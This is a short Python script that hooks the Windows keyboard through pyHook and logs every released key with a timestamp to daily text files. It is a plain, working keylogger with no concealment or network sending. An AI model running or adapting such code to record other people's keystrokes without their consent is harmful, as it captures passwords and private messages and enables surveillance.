import pyHook
import pythoncom
import time

class KeyBoardManager():
    keyIsPressed = False
    def onKeyDown(self,event):
        if self.keyIsPressed:
            return True
        print(str(event.Key) + ' is released')
        self.keyIsPressed = True
        return True

    def onKeyUp(self, event):
        self.keyIsPressed = False
        key = str(event.Key)
        with open('./key_log/%s.txt' % time.strftime('%y%m%d'), 'a+') as f:
            f.write(time.strftime('%H:%M:%S') + '    ' + key)
            f.write('\n')
        return True

if __name__ == '__main__':
    mykbmanager = KeyBoardManager()
    hookmanager = pyHook.HookManager()
    # hookmanager.KeyDown = mykbmanager.onKeyDown
    hookmanager.KeyUp = mykbmanager.onKeyUp
    hookmanager.HookKeyboard()
    pythoncom.PumpMessages()